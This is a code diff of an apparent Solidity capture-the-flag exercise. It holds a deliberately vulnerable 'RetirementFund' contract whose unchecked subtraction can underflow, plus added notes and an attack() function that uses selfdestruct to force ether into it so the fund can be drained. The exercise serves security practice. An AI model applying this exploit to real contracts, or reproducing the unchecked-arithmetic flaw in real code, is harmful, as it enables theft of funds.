@@ -23,18 +23,16 @@ contract RetirementFund {
 
         if (block.timestamp < expiration) {
             // early withdrawal incurs a 10% penalty
-            (bool ok, ) = msg.sender.call{
-                value: (address(this).balance * 9) / 10
-            }("");
+            (bool ok,) = msg.sender.call{value: (address(this).balance * 9) / 10}("");
             require(ok, "Transfer to msg.sender failed");
         } else {
-            (bool ok, ) = msg.sender.call{value: address(this).balance}("");
+            (bool ok,) = msg.sender.call{value: address(this).balance}("");
             require(ok, "Transfer to msg.sender failed");
         }
     }
 
     function collectPenalty() public {
-        require(msg.sender == beneficiary);
+        require(msg.sender == beneficiary, "Wrong sender");
         uint256 withdrawn = 0;
         unchecked {
             withdrawn += startBalance - address(this).balance;
@@ -44,17 +42,30 @@ contract RetirementFund {
         }
 
         // penalty is what's left
-        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
+        (bool ok,) = msg.sender.call{value: address(this).balance}("");
         require(ok, "Transfer to msg.sender failed");
     }
 }
 
 // Write your exploit contract below
+// Observations:
+// withdraw is public
+// collectPenalty is public
+// both reenter, but only after doing state changes
+// collectPenalty has an unchecked block
+// the unchecked block overflows if startBalance - address(this).balance is less than 0
+// startBalance is always 1 ether
+// we can donate to the contract to make address(this).balance higher than 1 ether
+// then we'll clear the fund
 contract ExploitContract {
     RetirementFund public retirementFund;
 
     constructor(RetirementFund _retirementFund) {
         retirementFund = _retirementFund;
+    }
+
+    function attack() public {
+        selfdestruct(payable(address(retirementFund)));
     }
 
     // write your exploit functions below
